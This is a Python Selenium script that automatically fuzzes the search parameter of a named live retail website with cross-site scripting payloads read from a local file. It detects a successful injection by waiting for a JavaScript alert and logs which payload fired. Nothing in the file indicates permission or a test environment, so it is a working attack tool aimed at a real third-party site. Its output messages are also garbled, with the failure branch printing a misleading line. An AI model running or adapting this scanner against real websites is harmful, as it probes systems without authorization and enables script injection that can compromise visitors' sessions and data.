from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
import time

target_url = [
	"https://www.homebargains.co.uk/search.aspx?searchterms="
]

driver = webdriver.Firefox(executable_path="D:\\driver\\geckodriver.exe");

myFile = open("./payload/my-payload-xss.txt", "r")
for item in myFile:
	for index_target_url, item_target_url in enumerate(target_url):
		driver.get(item_target_url + item)

		try:
			alert = WebDriverWait(driver,5).until(EC.alert_is_present())
			alert.accept()
			print("Alert Apper with : " + item)
		except TimeoutException:
			print("Alert does apper")

		time.sleep(3)
	
	time.sleep(3)

time.sleep(5);
driver.quit();
print("DONE")